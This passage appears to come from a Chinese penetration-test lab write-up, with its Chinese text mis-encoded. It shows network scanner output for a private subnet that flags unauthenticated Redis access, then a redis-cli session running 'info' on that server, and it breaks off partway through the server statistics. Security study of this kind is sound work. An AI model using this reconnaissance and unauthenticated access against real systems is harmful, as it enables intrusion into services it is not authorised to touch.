</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>39</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>æœåŠ¡è¯†åˆ«</span> <span class=mf>192.168.100.20</span><span class=p>:</span><span class=mi>6379</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=n>redis</span><span class=p>]</span> <span class=n>ç‰ˆæœ¬</span><span class=p>:</span><span class=mf>7.4.5</span> <span class=n>äº§å“</span><span class=p>:</span><span class=n>Redis</span> <span class=n>key</span><span class=o>-</span><span class=n>value</span> <span class=n>store</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>39</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>æœåŠ¡è¯†åˆ«</span> <span class=mf>192.168.100.40</span><span class=p>:</span><span class=mi>8080</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=n>http</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>39</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>æœåŠ¡è¯†åˆ«</span> <span class=mf>192.168.100.30</span><span class=p>:</span><span class=mi>8080</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=n>http</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>44</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>æœåŠ¡è¯†åˆ«</span> <span class=mf>192.168.100.1</span><span class=p>:</span><span class=mi>3000</span> <span class=o>=&gt;</span> <span class=p>[</span><span class=n>http</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>44</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>å­˜æ´»ç«¯å£æ•°é‡</span><span class=p>:</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>44</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>å¼€å§‹æ¼æ´æ‰«æ</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>44</span><span class=p>]</span> <span class=p>[</span><span class=n>INFO</span><span class=p>]</span> <span class=n>åŠ è½½çš„æ’ä»¶</span><span class=p>:</span> <span class=n>redis</span><span class=p>,</span> <span class=n>ssh</span><span class=p>,</span> <span class=n>webpoc</span><span class=p>,</span> <span class=n>webtitle</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>44</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç½‘ç«™æ ‡é¢˜</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168.100.30</span><span class=p>:</span><span class=mi>8080</span> <span class=n>çŠ¶æ€ç </span><span class=p>:</span><span class=mi>200</span> <span class=n>é•¿åº¦</span><span class=p>:</span><span class=mi>5976</span>   <span class=n>æ ‡é¢˜</span><span class=p>:</span><span class=n>æ™ºèƒ½åŠå…¬ç®¡ç†ç³»ç»Ÿ</span> <span class=o>-</span> <span class=n>æ™ºèƒ½åŠå…¬ç®¡ç†ç³»ç»Ÿ</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>44</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç½‘ç«™æ ‡é¢˜</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168.100.1</span><span class=p>:</span><span class=mi>3000</span> <span class=n>çŠ¶æ€ç </span><span class=p>:</span><span class=mi>200</span> <span class=n>é•¿åº¦</span><span class=p>:</span><span class=mi>7801</span>   <span class=n>æ ‡é¢˜</span><span class=p>:</span><span class=n>æ™ºèƒ½å•†åŸ</span> <span class=o>-</span> <span class=n>æ‚¨çš„è´­ç‰©å¤©å ‚</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>44</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>ç½‘ç«™æ ‡é¢˜</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>192.168.100.40</span><span class=p>:</span><span class=mi>8080</span> <span class=n>çŠ¶æ€ç </span><span class=p>:</span><span class=mi>200</span> <span class=n>é•¿åº¦</span><span class=p>:</span><span class=mi>7211</span>   <span class=n>æ ‡é¢˜</span><span class=p>:</span><span class=n>Open</span> <span class=n>WebUI</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>47</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>Redis</span> <span class=mf>192.168.100.20</span><span class=p>:</span><span class=mi>6379</span> <span class=n>å‘ç°æœªæˆæƒè®¿é—®</span> <span class=n>æ–‡ä»¶ä½ç½®</span><span class=p>:</span><span class=o>/</span><span class=n>data</span><span class=o>/</span><span class=n>dump</span><span class=o>.</span><span class=n>rdb</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>51</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>Redisæ— å¯†ç è¿æ¥æˆåŠŸ</span><span class=p>:</span> <span class=mf>192.168.100.20</span><span class=p>:</span><span class=mi>6379</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>2025</span><span class=o>-</span><span class=mi>09</span><span class=o>-</span><span class=mi>20</span> <span class=mi>13</span><span class=p>:</span><span class=mi>29</span><span class=p>:</span><span class=mi>51</span><span class=p>]</span> <span class=p>[</span><span class=n>SUCCESS</span><span class=p>]</span> <span class=n>æ‰«æå·²å®Œæˆ</span><span class=p>:</span> <span class=mi>8</span><span class=o>/</span><span class=mi>8</span>
</span></span></code></pre></td></tr></table></div></div><p>æœ‰ä¸ªredisæœªæˆæƒè¿æ¥ä¸€ä¸‹</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>PS</span> <span class=n>C</span><span class=p>:</span>\<span class=n>Users</span>\<span class=n>baozhongqi</span><span class=o>&gt;</span> <span class=n>redis</span><span class=o>-</span><span class=n>cli</span> <span class=o>-</span><span class=n>h</span> <span class=mf>192.168.100.20</span> <span class=o>-</span><span class=n>p</span> <span class=mi>6379</span>
</span></span><span class=line><span class=cl><span class=mf>192.168.100.20</span><span class=p>:</span><span class=mi>6379</span><span class=o>&gt;</span> <span class=n>info</span>
</span></span><span class=line><span class=cl><span class=c1># Server</span>
</span></span><span class=line><span class=cl><span class=n>redis_version</span><span class=p>:</span><span class=mf>7.4.5</span>
</span></span><span class=line><span class=cl><span class=n>redis_git_sha1</span><span class=p>:</span><span class=mi>00000000</span>
</span></span><span class=line><span class=cl><span class=n>redis_git_dirty</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>redis_build_id</span><span class=p>:</span><span class=mi>14</span><span class=n>ef7c78d3983ab</span>
</span></span><span class=line><span class=cl><span class=n>redis_mode</span><span class=p>:</span><span class=n>standalone</span>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=p>:</span><span class=n>Linux</span> <span class=mf>6.1.0</span><span class=o>-</span><span class=mi>37</span><span class=o>-</span><span class=n>amd64</span> <span class=n>x86_64</span>
</span></span><span class=line><span class=cl><span class=n>arch_bits</span><span class=p>:</span><span class=mi>64</span>
</span></span><span class=line><span class=cl><span class=n>monotonic_clock</span><span class=p>:</span><span class=n>POSIX</span> <span class=n>clock_gettime</span>
</span></span><span class=line><span class=cl><span class=n>multiplexing_api</span><span class=p>:</span><span class=n>epoll</span>
</span></span><span class=line><span class=cl><span class=n>atomicvar_api</span><span class=p>:</span><span class=n>c11</span><span class=o>-</span><span class=n>builtin</span>
</span></span><span class=line><span class=cl><span class=n>gcc_version</span><span class=p>:</span><span class=mf>14.2.0</span>
</span></span><span class=line><span class=cl><span class=n>process_id</span><span class=p>:</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>process_supervised</span><span class=p>:</span><span class=n>no</span>
</span></span><span class=line><span class=cl><span class=n>run_id</span><span class=p>:</span><span class=mi>164070046</span><span class=n>b533e020f5f5b58eae4654a63257f43</span>
</span></span><span class=line><span class=cl><span class=n>tcp_port</span><span class=p>:</span><span class=mi>6379</span>
</span></span><span class=line><span class=cl><span class=n>server_time_usec</span><span class=p>:</span><span class=mi>1758375263434887</span>
</span></span><span class=line><span class=cl><span class=n>uptime_in_seconds</span><span class=p>:</span><span class=mi>79981</span>
</span></span><span class=line><span class=cl><span class=n>uptime_in_days</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>hz</span><span class=p>:</span><span class=mi>10</span>
</span></span><span class=line><span class=cl><span class=n>configured_hz</span><span class=p>:</span><span class=mi>10</span>
</span></span><span class=line><span class=cl><span class=n>lru_clock</span><span class=p>:</span><span class=mi>13544799</span>
</span></span><span class=line><span class=cl><span class=n>executable</span><span class=p>:</span><span class=o>/</span><span class=n>data</span><span class=o>/</span><span class=n>redis</span><span class=o>-</span><span class=n>server</span>
</span></span><span class=line><span class=cl><span class=n>config_file</span><span class=p>:</span>
</span></span><span class=line><span class=cl><span class=n>io_threads_active</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>listener0</span><span class=p>:</span><span class=n>name</span><span class=o>=</span><span class=n>tcp</span><span class=p>,</span><span class=n>bind</span><span class=o>=*</span><span class=p>,</span><span class=n>bind</span><span class=o>=-</span><span class=p>::</span><span class=o>*</span><span class=p>,</span><span class=n>port</span><span class=o>=</span><span class=mi>6379</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Clients</span>
</span></span><span class=line><span class=cl><span class=n>connected_clients</span><span class=p>:</span><span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>cluster_connections</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>maxclients</span><span class=p>:</span><span class=mi>10000</span>
</span></span><span class=line><span class=cl><span class=n>client_recent_max_input_buffer</span><span class=p>:</span><span class=mi>20480</span>
</span></span><span class=line><span class=cl><span class=n>client_recent_max_output_buffer</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>blocked_clients</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>tracking_clients</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>pubsub_clients</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>watching_clients</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>clients_in_timeout_table</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>total_watched_keys</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>total_blocking_keys</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>total_blocking_keys_on_nokey</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Memory</span>
</span></span><span class=line><span class=cl><span class=n>used_memory</span><span class=p>:</span><span class=mi>1399664</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_human</span><span class=p>:</span><span class=mf>1.33</span><span class=n>M</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_rss</span><span class=p>:</span><span class=mi>10629120</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_rss_human</span><span class=p>:</span><span class=mf>10.14</span><span class=n>M</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_peak</span><span class=p>:</span><span class=mi>1558104</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_peak_human</span><span class=p>:</span><span class=mf>1.49</span><span class=n>M</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_peak_perc</span><span class=p>:</span><span class=mf>89.83</span><span class=o>%</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_overhead</span><span class=p>:</span><span class=mi>974712</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_startup</span><span class=p>:</span><span class=mi>946168</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_dataset</span><span class=p>:</span><span class=mi>424952</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_dataset_perc</span><span class=p>:</span><span class=mf>93.71</span><span class=o>%</span>
</span></span><span class=line><span class=cl><span class=n>allocator_allocated</span><span class=p>:</span><span class=mi>2109640</span>
</span></span><span class=line><span class=cl><span class=n>allocator_active</span><span class=p>:</span><span class=mi>2482176</span>
</span></span><span class=line><span class=cl><span class=n>allocator_resident</span><span class=p>:</span><span class=mi>5873664</span>
</span></span><span class=line><span class=cl><span class=n>allocator_muzzy</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>total_system_memory</span><span class=p>:</span><span class=mi>7992999936</span>
</span></span><span class=line><span class=cl><span class=n>total_system_memory_human</span><span class=p>:</span><span class=mf>7.44</span><span class=n>G</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_lua</span><span class=p>:</span><span class=mi>31744</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_vm_eval</span><span class=p>:</span><span class=mi>31744</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_lua_human</span><span class=p>:</span><span class=mf>31.00</span><span class=n>K</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_scripts_eval</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>number_of_cached_scripts</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>number_of_functions</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>number_of_libraries</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_vm_functions</span><span class=p>:</span><span class=mi>32768</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_vm_total</span><span class=p>:</span><span class=mi>64512</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_vm_total_human</span><span class=p>:</span><span class=mf>63.00</span><span class=n>K</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_functions</span><span class=p>:</span><span class=mi>192</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_scripts</span><span class=p>:</span><span class=mi>192</span>
</span></span><span class=line><span class=cl><span class=n>used_memory_scripts_human</span><span class=p>:</span><span class=mi>192</span><span class=n>B</span>
</span></span><span class=line><span class=cl><span class=n>maxmemory</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>maxmemory_human</span><span class=p>:</span><span class=mi>0</span><span class=n>B</span>
</span></span><span class=line><span class=cl><span class=n>maxmemory_policy</span><span class=p>:</span><span class=n>noeviction</span>
</span></span><span class=line><span class=cl><span class=n>allocator_frag_ratio</span><span class=p>:</span><span class=mf>1.18</span>
</span></span><span class=line><span class=cl><span class=n>allocator_frag_bytes</span><span class=p>:</span><span class=mi>296504</span>
</span></span><span class=line><span class=cl><span class=n>allocator_rss_ratio</span><span class=p>:</span><span class=mf>2.37</span>
</span></span><span class=line><span class=cl><span class=n>allocator_rss_bytes</span><span class=p>:</span><span class=mi>3391488</span>
</span></span><span class=line><span class=cl><span class=n>rss_overhead_ratio</span><span class=p>:</span><span class=mf>1.81</span>
</span></span><span class=line><span class=cl><span class=n>rss_overhead_bytes</span><span class=p>:</span><span class=mi>4755456</span>
</span></span><span class=line><span class=cl><span class=n>mem_fragmentation_ratio</span><span class=p>:</span><span class=mf>7.60</span>
</span></span><span class=line><span class=cl><span class=n>mem_fragmentation_bytes</span><span class=p>:</span><span class=mi>9231280</span>
</span></span><span class=line><span class=cl><span class=n>mem_not_counted_for_evict</span><span class=p>:</span><span class=mi>640</span>
</span></span><span class=line><span class=cl><span class=n>mem_replication_backlog</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>mem_total_replication_buffers</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>mem_clients_slaves</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>mem_clients_normal</span><span class=p>:</span><span class=mi>26256</span>
</span></span><span class=line><span class=cl><span class=n>mem_cluster_links</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>mem_aof_buffer</span><span class=p>:</span><span class=mi>640</span>
</span></span><span class=line><span class=cl><span class=n>mem_allocator</span><span class=p>:</span><span class=n>jemalloc</span><span class=o>-</span><span class=mf>5.3.0</span>
</span></span><span class=line><span class=cl><span class=n>mem_overhead_db_hashtable_rehashing</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>active_defrag_running</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>lazyfree_pending_objects</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>lazyfreed_objects</span><span class=p>:</span><span class=mi>9</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Persistence</span>
</span></span><span class=line><span class=cl><span class=n>loading</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>async_loading</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>current_cow_peak</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>current_cow_size</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>current_cow_size_age</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>current_fork_perc</span><span class=p>:</span><span class=mf>0.00</span>
</span></span><span class=line><span class=cl><span class=n>current_save_keys_processed</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>current_save_keys_total</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>rdb_changes_since_last_save</span><span class=p>:</span><span class=mi>12</span>
</span></span><span class=line><span class=cl><span class=n>rdb_bgsave_in_progress</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>rdb_last_save_time</span><span class=p>:</span><span class=mi>1758372929</span>
</span></span><span class=line><span class=cl><span class=n>rdb_last_bgsave_status</span><span class=p>:</span><span class=n>ok</span>
</span></span><span class=line><span class=cl><span class=n>rdb_last_bgsave_time_sec</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>rdb_current_bgsave_time_sec</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>rdb_saves</span><span class=p>:</span><span class=mi>3</span>
</span></span><span class=line><span class=cl><span class=n>rdb_last_cow_size</span><span class=p>:</span><span class=mi>380928</span>
</span></span><span class=line><span class=cl><span class=n>rdb_last_load_keys_expired</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>rdb_last_load_keys_loaded</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>aof_enabled</span><span class=p>:</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>aof_rewrite_in_progress</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>aof_rewrite_scheduled</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>aof_last_rewrite_time_sec</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>aof_current_rewrite_time_sec</span><span class=p>:</span><span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl><span class=n>aof_last_bgrewrite_status</span><span class=p>:</span><span class=n>ok</span>
</span></span><span class=line><span class=cl><span class=n>aof_rewrites</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>aof_rewrites_consecutive_failures</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>aof_last_write_status</span><span class=p>:</span><span class=n>ok</span>
</span></span><span class=line><span class=cl><span class=n>aof_last_cow_size</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>module_fork_in_progress</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>module_fork_last_cow_size</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>aof_current_size</span><span class=p>:</span><span class=mi>2697</span>
</span></span><span class=line><span class=cl><span class=n>aof_base_size</span><span class=p>:</span><span class=mi>88</span>
</span></span><span class=line><span class=cl><span class=n>aof_pending_rewrite</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>aof_buffer_length</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>aof_pending_bio_fsync</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>aof_delayed_fsync</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Stats</span>
</span></span><span class=line><span class=cl><span class=n>total_connections_received</span><span class=p>:</span><span class=mi>7989</span>
</span></span><span class=line><span class=cl><span class=n>total_commands_processed</span><span class=p>:</span><span class=mi>10969</span>
</span></span><span class=line><span class=cl><span class=n>instantaneous_ops_per_sec</span><span class=p>:</span><span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>total_net_input_bytes</span><span class=p>:</span><span class=mi>164092</span>
</span></span><span class=line><span class=cl><span class=n>total_net_output_bytes</span><span class=p>:</span><span class=mi>409348</span>
